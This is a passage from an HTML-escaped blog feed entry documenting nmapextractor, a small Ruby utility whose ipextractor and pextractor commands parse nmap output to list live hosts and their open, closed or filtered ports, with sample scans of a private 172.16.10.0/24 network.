&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-PE&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 172.16.10.0/24 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; - | ipextractor &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt;
172.16.10.1
172.16.10.11
172.16.10.19
172.16.10.20
172.16.10.37
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-pextractor---port-extractor&quot;&gt;&lt;strong&gt;2. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pextractor&lt;/code&gt; - Port Extractor.&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;Assuming that we employ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipextractor&lt;/code&gt; to retain a list of target hosts. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pextractor&lt;/code&gt; is used to extract ports of a host.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Help menu:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pextractor
pextractor - A nmap parsing tool

It is used to extract &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;open | closed | filtered] ports &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a nmap file.

Usage: pextractor &amp;lt;IP&amp;gt; &amp;lt;Port State&amp;gt; &amp;lt;File Type&amp;gt; &amp;lt;Nmap File&amp;gt;

PORT STATES:
 &lt;span class=&quot;nt&quot;&gt;-open&lt;/span&gt;      is opened ports of a host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;-closed&lt;/span&gt;    is closed ports of a host.
 &lt;span class=&quot;nt&quot;&gt;-filtered&lt;/span&gt;  is filtered ports of a host.

FILE TYPES:
 &lt;span class=&quot;nt&quot;&gt;-oX&lt;/span&gt; is xml nmap output. 
 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; is nmap output. 
 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; is grepable nmap output.
           
NOTE: 
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FILE TYPE] is NOT required when file has 
 .nmap | .xml | .gnmap extension


EXAMPLES:
 pextractor 192.168.0.20 ports.nmap
 pextractor 192.168.0.20 &lt;span class=&quot;nt&quot;&gt;-oX&lt;/span&gt; ports.xml
 pextractor 192.168.0.20 &lt;span class=&quot;nt&quot;&gt;-filtered&lt;/span&gt; nmap_scan.gnmap
 nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; 192.168.0.0/24 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; - | pextractor 192.16.0.20 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;example-1&quot;&gt;&lt;strong&gt;Example&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Read ports of a host from a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; file.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;strong&gt;default port state&lt;/strong&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pextractor 172.16.10.20 nmap/scan.nmap 
23
135
139
445
2869
3389
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can imagine, it is possible to also read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gnmap&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.xml&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pextractor 172.16.10.37 nmap/scan.xml 
135
139
1027
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Read ports of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; stream.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It’s feasible to parse result from a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; stream with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pextractor&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,445,139,135,1027,443,53 &lt;span class=&quot;nt&quot;&gt;-iL&lt;/span&gt; alive_hosts &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; - | pextractor 172.16.10.37 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; 
135
139
1027
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Besides &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oN&lt;/code&gt; stream, we can read other streams i.e. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oG&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oX&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,445,139,135,1027,443,53 &lt;span class=&quot;nt&quot;&gt;-iL&lt;/span&gt; alive_hosts &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; - | pextractor 172.16.10.37 &lt;span class=&quot;nt&quot;&gt;-closed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt;
53
80
443
445
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The above command executes with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-closed&lt;/code&gt; switch, this tells &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pextractor&lt;/code&gt; to extract only the ports with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;closed&lt;/code&gt; state.&lt;/p&gt;

&lt;p&gt;That’s primarily everything about the tools and the project - a simple and relaxed project that helps to boost up the enumeration phase.&lt;/p&gt;</content><author><name></name></author><category term="enumerator" /><category term="redteam" /><category term="nmap" /><summary type="html">General Information nmapextractor is a small project written in Ruby with the purposes of:</summary></entry></feed>